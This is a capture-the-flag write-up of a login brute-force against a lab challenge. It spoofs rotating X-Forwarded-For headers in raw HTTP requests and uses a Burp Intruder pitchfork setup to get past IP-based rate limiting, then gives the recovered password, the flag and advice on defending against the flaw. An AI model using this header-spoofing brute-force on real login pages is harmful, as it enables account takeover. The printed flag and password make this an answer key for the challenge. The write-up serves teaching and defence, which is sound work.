
# Crack the Gate 2 — CTF Write-up

## Challenge Information

| Field          | Details                               |
| -------------- | ------------------------------------- |
| Platform       | CyLab Academy                         |
| Challenge      | Crack the Gate 2                      |
| Category       | Web Exploitation                      |
| Vulnerability  | Rate-limit bypass                     |
| Technique      | `X-Forwarded-For` header manipulation |
| Tool           | Burp Suite                            |
| Known Username | `ctf-player@cylabacademy.org`         |

---

# 1. Challenge Overview

The challenge presents a login page where repeated failed login attempts are rate-limited.

The challenge provides a known email address:

```text
ctf-player@cylabacademy.org
```

but the password is unknown.

A password wordlist is provided.

The objective is to determine the password and obtain the flag.

The important clue is that the rate limiter tracks requests based on the **source IP address**, and the challenge hints indicate that the application may trust the `X-Forwarded-For` HTTP header.

---

# 2. Initial Request

The login request was a JSON `POST` request:

```http
POST /login HTTP/1.1
Host: xebec.cylabacademy.net:27973
Content-Type: application/json

{
    "email": "ctf-player@cylabacademy.org",
    "password": "test"
}
```

An incorrect password produced a response similar to:

```json
{
    "success": false
}
```

After repeatedly submitting incorrect passwords, the server eventually returned:

```http
HTTP/1.1 429 Too Many Requests
```

with:

```json
{
    "success": false,
    "error": "Too many failed attempts. Please try again in 20 minutes."
}
```

This confirmed that a rate-limiting mechanism was present.

---

# 3. Understanding the Rate Limiter

The important question was:

> **How does the application identify the client?**

A simplified rate limiter could work like:

```text
Client IP
    ↓
Rate limiter
    ↓
Count failed attempts
    ↓
Too many attempts?
    ↓
Block
```

For example:

```text
IP: 192.168.1.10

Attempt 1
Attempt 2
Attempt 3
Attempt 4
Attempt 5
    ↓
RATE LIMITED
```

If the application trusts a user-controlled header to determine the IP, this creates a potential bypass.

---

# 4. Challenge Hints

The challenge provided hints related to:

* determining what IP the server thinks the client has
* understanding `X-Forwarded-For`
* rotating fake IP addresses

This pointed toward investigating proxy-related HTTP headers.

---

# 5. Investigating `X-Forwarded-For`

The following header was added to the request:

```http
X-Forwarded-For: 10.0.0.1
```

The request became:

```http
POST /login HTTP/1.1
Host: xebec.cylabacademy.net:27973
Content-Type: application/json
X-Forwarded-For: 10.0.0.1

{
    "email": "ctf-player@cylabacademy.org",
    "password": "test"
}
```

The application accepted the request.

The value was then changed:

```http
X-Forwarded-For: 10.0.0.2
```

and again:

```http
X-Forwarded-For: 10.0.0.3
```

This demonstrated that the application was processing the supplied forwarding header.

---

# 6. Why `X-Forwarded-For` Matters

`X-Forwarded-For` is commonly used when a reverse proxy sits between a client and an application.

The architecture can look like:

```text
┌──────────┐
│  Client  │
└────┬─────┘
     │
     ▼
┌──────────┐
│  Proxy   │
└────┬─────┘
     │
     ▼
┌──────────┐
│   App    │
└──────────┘
```

The proxy may tell the application the original client IP using:

```http
X-Forwarded-For: <client-ip>
```

The security problem occurs when the backend blindly trusts a header that an external client can directly supply.

---

# 7. Rate-Limit Bypass

The application effectively treated different `X-Forwarded-For` values as different sources.

Conceptually:

```text
X-Forwarded-For: 10.0.0.1
        ↓
Client A
        ↓
failed attempt

X-Forwarded-For: 10.0.0.2
        ↓
Client B
        ↓
failed attempt

X-Forwarded-For: 10.0.0.3
        ↓
Client C
        ↓
failed attempt
```

Therefore, instead of accumulating all failed attempts against one source, the attacker could rotate the header value.

The core vulnerability was:

```text
Untrusted HTTP header
        ↓
Used as client identity
        ↓
Used by rate limiter
        ↓
Rate-limit bypass
```

---

# 8. Burp Suite Intruder

After confirming the behavior manually with Repeater, the attack was automated using **Burp Intruder**.

Two payload positions were configured.

### Payload 1 — IP

The request contained:

```http
X-Forwarded-For: 10.0.0.§1§
```

The first payload generated different values:

```text
1
2
3
...
```

resulting in:

```text
10.0.0.1
10.0.0.2
10.0.0.3
...
```

### Payload 2 — Password

The second payload position was:

```json
"password":"§test§"
```

The supplied password wordlist was loaded into Burp.

---

# 9. Pitchfork Attack

We used **Pitchfork** rather than Cluster Bomb.

The reason was that we wanted to pair one IP with one password:

```text
IP                 Password

10.0.0.1     →     password1
10.0.0.2     →     password2
10.0.0.3     →     password3
10.0.0.4     →     password4
```

This avoids testing every possible combination.

With Cluster Bomb, Burp would instead perform:

```text
IP1 + password1
IP1 + password2
IP1 + password3

IP2 + password1
IP2 + password2
IP2 + password3
...
```

which produces significantly more requests.

---

# 10. Successful Request

The successful Intruder result showed:

```http
X-Forwarded-For: 10.0.0.2
```

with the password:

```text
AXVkXlLp
```

The server returned:

```json
{
    "success": true,
    "email": "ctf-player@cylabacademy.org",
    "firstName": "pico",
    "lastName": "player",
    "flag": "academy{xff_byp4ss_brut3_86353db7}"
}
```

### Flag

```text
academy{xff_byp4ss_brut3_86353db7}
```

---

# 11. Python Automation

After completing the challenge manually with Burp, the same concept was reproduced using Python.

The Python script performed:

```text
Read password list
       ↓
Generate different IP
       ↓
Create X-Forwarded-For header
       ↓
Send POST /login
       ↓
Parse JSON response
       ↓
Check success
       ↓
Stop when successful
```

The important Python concepts learned were:

```python
requests.post()
```

for HTTP requests,

```python
headers = {...}
```

for custom HTTP headers,

```python
json=data
```

for JSON request bodies,

```python
with open(...)
```

for reading wordlists,

and:

```python
result.get("success")
```

for processing the server's JSON response.

---

# 12. What I Learned

### HTTP headers

This challenge introduced the security importance of HTTP headers.

In particular:

```text
X-Forwarded-For
```

is not simply "another HTTP header."

Its security impact depends on **who is trusted to set it**.

---

### Rate limiting

Rate limiting can be based on:

```text
IP
Account
Session
API key
Device
Combination of identifiers
```

A poorly designed implementation can be bypassed if its identifier can be manipulated.

---

### Burp Repeater

Used Repeater to manually test:

```text
normal request
      ↓
rate limit
      ↓
X-Forwarded-For
      ↓
different IP
      ↓
response
```

This was useful for understanding the vulnerability before automating it.

---

### Burp Intruder

Used Intruder to automate:

```text
IP + password
```

combinations from payload lists.

---

# 13. Vulnerability Classification

The underlying issue can be described as:

**Improper trust of client-controlled proxy headers leading to rate-limit bypass.**

Relevant concepts:

```text
HTTP Header Trust
       +
Reverse Proxy Configuration
       +
IP-Based Rate Limiting
       ↓
Rate-Limit Bypass
```

---

# 14. How Developers Should Prevent This

The application should **not blindly trust**:

```http
X-Forwarded-For
```

from arbitrary Internet clients.

Instead, the infrastructure should establish a trusted proxy boundary:

```text
Internet
   │
   ▼
Trusted Reverse Proxy
   │
   │ sets/normalizes client IP
   ▼
Application
```

The application should only trust forwarding information coming from configured, trusted proxies.

Rate limiting should also avoid relying on a single easily manipulated client-controlled value.

Additional controls can include:

```text
IP-based limits
+
account-based limits
+
session/device signals
+
progressive delays
+
login monitoring
+
account lockout policies
```

The exact combination depends on the application's threat model.

---

# 15. Key CTF Takeaway

The most important lesson from this challenge wasn't the password.

It was this:

```text
              HTTP HEADER
                   │
                   ▼
          Who controls it?
                   │
          ┌────────┴────────┐
          │                 │
     Trusted proxy      Attacker
          │                 │
          ▼                 ▼
       Reliable          Untrusted
       metadata          input
```

Whenever you encounter a security-sensitive header in a CTF, ask:

> **Who is supposed to set this header, and does the application actually verify that source?**

That question will help you recognize similar vulnerabilities involving `X-Forwarded-For`, `X-Real-IP`, `Forwarded`, `Host`, `Origin`, `Referer`, and other HTTP headers.

---

## Tools Used

```text
Burp Suite
Python 3
requests
curl
Browser DevTools
```

## Final Flag

```text
academy{xff_byp4ss_brut3_86353db7}
```